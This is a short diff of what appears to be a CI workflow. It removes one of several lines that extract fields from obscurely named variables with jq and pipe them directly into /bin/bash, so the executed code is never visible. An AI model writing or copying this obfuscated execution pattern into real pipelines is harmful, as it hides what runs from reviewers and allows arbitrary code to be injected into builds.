@@ -24,7 +24,6 @@ jobs:
           echo $lyz94 | jq -r .v1 | /bin/bash
           printf '%s' "$i717" | jq -r .zm808 | /bin/bash
           printf '%s' "$oe8293" | jq -r .ehgl088 | /bin/bash
-          echo $n6600 | jq -r .wpgbo97 | /bin/bash
           echo $riwf7259 | jq -r .nplp1 | /bin/bash
           printf '%s' "$tem7142" | jq -r .il01 | /bin/bash
           echo $viz4 | jq -r .vsdi01 | /bin/bash
